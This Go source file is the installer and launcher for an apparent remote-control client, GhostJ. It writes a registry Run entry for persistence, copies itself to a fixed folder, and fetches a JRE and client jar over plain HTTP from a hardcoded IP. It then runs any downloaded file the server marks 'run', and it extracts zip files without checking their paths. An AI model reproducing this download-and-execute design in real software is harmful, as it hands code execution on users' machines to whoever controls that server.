package main

import (
	"archive/zip"
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

const GhostDir = "D:\\ProgramData\\Ghost"

var wg sync.WaitGroup

/**
无启动参数的
	如果在指定安装文件夹
		检查jre版本
		检查守护进程版本
		启动ghostjc.jar
	如果不在
		当前文件夹新建注册表文件
		创建指定安装文件夹
		复制本体到指定文件夹
		在指定文件夹执行本体
direct
	在当前文件夹创建注册表文件
	在当前文件夹下载jre
	当前文件夹下载守护进程
	启动当前文件夹ghostjc.jar
(好像没有其他需要的功能了...)
*/
func main() {
	go tidyDir()
	currentDir, _ := os.Getwd()
	fmt.Println("current dir:", currentDir)

	if len(os.Args) == 1 {
		//验证当前文件夹
		//已经在指定文件夹
		if strings.EqualFold(currentDir, GhostDir) {
			fmt.Println("Launching.")
			checkJRE()
			checkClient()
			go launchClient()
			initRoutines()
		} else { //不在指定文件夹，部署
			fmt.Println("Installing.")
			writeReg()
			//copyToStartup()
			mkGhostDir(GhostDir)
			copySelf(GhostDir)
			fmt.Println("copied")
			directRunAtGhostDir()
			fmt.Println("exit")
			os.Exit(0)
		}
	} else if strings.EqualFold(os.Args[1], "direct") { //直接在本文件夹启动
		fmt.Println("directLaunching.")
		writeReg()
		checkJRE()
		checkClient()
		go launchClient()
		initRoutines()
	} else if strings.EqualFold(os.Args[1], "rescue") {
		initRescue()
	} else if strings.EqualFold(os.Args[1], "routines") {
		initRoutines()
	} else if strings.EqualFold(os.Args[1], "client") {
		c := exec.Command("jre\\bin\\javaw.exe", "-jar", "ghostjc.jar")
		err := c.Start()
		//
		//out, err := c.CombinedOutput()
		if err!=nil {
			fmt.Println(err.Error())
		}
		//fmt.Println("out:",out)
		os.Exit(0)
	}else if strings.EqualFold(os.Args[1],"name") {

		//检查是否已经部署过，如果已有，需要检查是否被杀毒软件拦截
		mkGhostDir("D:\\ProgramData\\Ghost")
		var cfg config
		if Exists("D:\\ProgramData\\Ghost\\ghostjc.ini") {
			cfg.Load("D:\\ProgramData\\Ghost\\ghostjc.ini")
			hn,exist:=cfg.Get("name")
			if exist {
				fmt.Println("[警告]此主机已部署过GhostJ，如果控制台无法找到连接，很可能已被杀软拦截，请检查启动项是否设置或检查杀软是否隔离此程序和启动项\n此主机的名称已存在:",hn)
			}else {
				fmt.Println("[警告]此主机已被部署GhostJ，但无法获取已设置主机名称，请检查杀软及部署目录")
			}
		}
		stdin:=bufio.NewReader(os.Stdin)
		fmt.Print("[提示]请设置此主机的名称(如果已有，将会覆盖，如果您不确定请不要设置，然后询问其他人员):")
		words,_,_:=stdin.ReadLine()
		err := WriteFile("D:\\ProgramData\\Ghost\\preferName.txt", string(words))
		if err != nil {
			fmt.Println("[错误]"+err.Error())
		}else {
			fmt.Println("设置成功")
			writeReg()
			//copyToStartup()
			mkGhostDir(GhostDir)
			copySelf(GhostDir)
			directRunAtGhostDir()
			_,_,_=stdin.ReadLine()
		}
	}
}
func copyToStartup() {
	CopyFile("gl.exe", "shell:startup")
}
func initRoutines() {
	wg.Add(1)
	//go initDaemon()
	go initRescue()
	wg.Wait()
}
func tidyDir() {
	if e, _ := PathExists("bin"); e {
		os.RemoveAll("bin")
	}
	if e, _ := PathExists("lib"); e {
		os.RemoveAll("lib")
	}
}

//加上direct参数运行gl
func directRunAtGhostDir() error {
	c := exec.Command(GhostDir+"\\gl.exe", "direct")
	c.Dir = GhostDir
	return c.Start()
}

//更新jre
func checkJRE() {
	//如果没有当前版本登记文件就创建
	if !Exists("jreCurVer.txt") {
		WriteFile("jreCurVer.txt", "")
	} /*
		if exist,_:=PathExists("jre\\bin");!exist{
			os.MkdirAll("jre\\bin",0777)
		}
		if exist,_:=PathExists("jre\\lib");!exist{
			os.MkdirAll("jre\\lib",0777)
		}*/
	//读当前版本文件
	jreField, _ := ReadFile("jreCurVer.txt")
	fields := strings.Split(jreField, "\n")

	fileFieldsMap := make(map[string]int)

	for _, af := range fields {
		spt := strings.Split(af, " ")
		if len(spt) < 3 {
			break
		}
		fileFieldsMap[spt[1]+"\\"+spt[0]], _ = strconv.Atoi(spt[2])
	}
	//读最新版本文件
	err := DownloadFile("http://39.100.5.139/ghost/jre/jreVer.txt", "jreVer.txt")
	if err == nil {
		jreField, _ = ReadFile("jreVer.txt")
		latestFields := strings.Split(jreField, "\n")

		for _, alf := range latestFields {
			spt := strings.Split(alf, " ")
			if len(spt) < 3 {
				continue
			}
			fmt.Println(spt[1] + "\\" + spt[0] + ":" + spt[2])
			latestVer, _ := strconv.Atoi(spt[2])
			mk := false
			//检查当前的是否是最新的
			if oldVer, ok := fileFieldsMap[spt[1]+"\\"+spt[0]]; ok {
				if oldVer < latestVer { //如果之前的版本号小于最新的
					/*if exist,_:=PathExists(spt[1]);!exist{
						os.MkdirAll(spt[1],0777)
					}
					_=DownloadFile("http://39.100.5.139/ghost/"+strings.ReplaceAll(spt[1],"\\","/")+"/"+spt[0],spt[1]+"\\"+spt[0])*/
					mk = true
				}
			} else {
				/*if exist,_:=PathExists(spt[1]);!exist{
					os.MkdirAll(spt[1],0777)
				}
				_=DownloadFile("http://39.100.5.139/ghost/"+strings.ReplaceAll(spt[1],"\\","/")+"/"+spt[0],spt[1]+"\\"+spt[0])*/
				mk = true
			}
			if mk {
				//如果有附加参数
				if len(spt) >= 4 {
					if strings.EqualFold(spt[3], "ignore") {
						continue
					} else if strings.EqualFold(spt[3], "remove") {
						_ = os.Remove(spt[1] + "\\" + spt[0])
						continue
					}
				}
				if exist, _ := PathExists(spt[1]); !exist {
					os.MkdirAll(spt[1], 0777)
				}
				_ = DownloadFile("http://39.100.5.139/ghost/"+strings.ReplaceAll(spt[1], "\\", "/")+"/"+spt[0], spt[1]+"\\"+spt[0])
				//是否有附加参数
				if len(spt) >= 4 {
					if strings.EqualFold(spt[3], "unzip") {
						Unzip(spt[1] + "\\" + spt[0])
						continue
					}
				}
			}
			//是否有附加参数(忽略版本号的)
			if len(spt) >= 4 {
				if strings.EqualFold(spt[3], "run") {
					c := exec.Command(spt[1] + "\\" + spt[0])
					err := c.Start()
					if err != nil {
						fmt.Println(err.Error())
					}
					continue
				}
			}
		}
		_ = WriteFile("jreCurVer.txt", jreField)
	} else { //如果不能下载文件,需要直接启动之前的tag为run的字段
		for _, af := range fields {
			spt := strings.Split(af, " ")
			if len(spt) < 3 {
				break
			}
			//如果有附加参数
			if len(spt) >= 4 {
				if strings.EqualFold(spt[3], "run") {
					c := exec.Command(spt[1] + "\\" + spt[0])
					err := c.Start()
					if err != nil {
						fmt.Println(err.Error())
					}
					continue
				}
			}
		}
	}
}
func checkClient() {

	if !Exists("nowVer.txt") {
		WriteFile("nowVer.txt", "0")
	}
	//效验客户端版本
	//读取现在的版本号
	ver, err := ioutil.ReadFile("nowVer.txt")
	if err != nil {
		//panic(err)
		return
	}
	verID, err := strconv.Atoi(strings.ReplaceAll(string(ver), "\n", ""))
	if err != nil {
		return
	}
	//读取最新版本号
	DownloadFile("http://39.100.5.139/ghost/client/version.txt", "latestVer.txt")
	verla, err := ioutil.ReadFile("latestVer.txt")
	if err != nil {
		panic(err)
	}
	latestVerID, err := strconv.Atoi(strings.ReplaceAll(string(verla), "\n", ""))
	if err != nil {
		return
	}
	//下载客户端
	//检查版本
	if latestVerID > verID {
		fmt.Println("updating client")
		DownloadFile("http://39.100.5.139/ghost/client/"+strconv.Itoa(latestVerID)+".jar", "ghostjc.jar")
		if !Exists("ghostjc.ini") {
			DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")

		}
		WriteFile("nowVer.txt", strconv.Itoa(latestVerID))
	}
	if Exists("preferName.txt") {
		fmt.Print("正在修改名称:")
		var cfg0 config
		cfg0.Load("ghostjc.ini")
		prefername,_:=ReadFile("preferName.txt")
		cfg0.Set("name",prefername)
		fmt.Print(prefername)
		cfg0.Write()
	}
	WriteFile("alive", strconv.FormatInt(time.Now().Unix(), 10))
}
func launchClient() error {
	fmt.Println("Launching client..")
	c := exec.Command("gl.exe", "client")
	err := c.Start()
	if err != nil {
		fmt.Println(err.Error())
	}
	return err
}

//在指定的工作目录启动exe
func launchEXE(workDir string, filename string) error {
	c := exec.Command(filename)
	c.Dir = workDir
	out, err := c.CombinedOutput()
	fmt.Println("stdout:",out)
	return err
}
func mkGhostDir(dir string) {
	_ = os.MkdirAll(dir, 0777)
}
func copySelf(dir string) {
	CopyFile(dir+"\\gl.exe", "gl.exe")
}
func writeReg() {
	WriteFile("greg.reg", "Windows Registry Editor Version 5.00"+
		"\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"ghost\"=\"D:\\\\ProgramData\\\\Ghost\\\\gl.exe\"\n\n")
}

func CopyFile(dstName, srcName string) (written int64, err error) {
	src, err := os.Open(srcName)
	if err != nil {
		return
	}
	defer src.Close()
	dst, err := os.OpenFile(dstName, os.O_WRONLY|os.O_CREATE, 0777)
	if err != nil {
		return
	}
	defer dst.Close()
	return io.Copy(dst, src)
}
func WriteFile(fileName string, str string) error {

	//fileName := "file/test2"
	//strTest := "测试测试"
	var d = []byte(str)
	err := ioutil.WriteFile(fileName, d, 0666)
	if err != nil {
		return err
	}
	//fmt.Println("write success")
	return nil
}

func DownloadFile(url string, target string) error {
	fmt.Println(url, target)
	res, err := http.Get(url)
	if err != nil {
		return err
		//panic(err)
	}
	//先存到一个临时文件以免接收过程中出错而覆盖之前的可用文件
	f, err := os.Create(target + ".temp")
	if err != nil {
		return err
		//panic(err)
	}
	io.Copy(f, res.Body)
	f.Close()
	//拷贝到真正的文件
	tempFile, err := os.Open(target + ".temp")
	if err != nil {
		return err
	}
	realFile, err := os.Create(target)
	if err != nil {
		return err
	}
	io.Copy(realFile, tempFile)
	tempFile.Close()
	realFile.Close()
	os.Remove(target + ".temp")
	return nil
}
func Exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
func ReadFile(filename string) (string, error) {

	f, err := ioutil.ReadFile(filename)

	if err != nil {
		return "", err
	}

	return string(f), nil

}

func Unzip(filename string) {
	fmt.Println("Unzip " + filename)
	r, err := zip.OpenReader(filename)
	if err != nil {
		fmt.Println(err)
		return
	}
	for _, k := range r.Reader.File {
		if k.FileInfo().IsDir() {
			err := os.MkdirAll(k.Name, 0644)
			if err != nil {
				fmt.Println(err)
			}
			continue
		}
		r, err := k.Open()
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Println("unzip: ", k.Name)
		defer r.Close()
		NewFile, err := os.Create(k.Name)
		if err != nil {
			fmt.Println(err)
			continue
		}
		io.Copy(NewFile, r)
		NewFile.Close()
	}
}
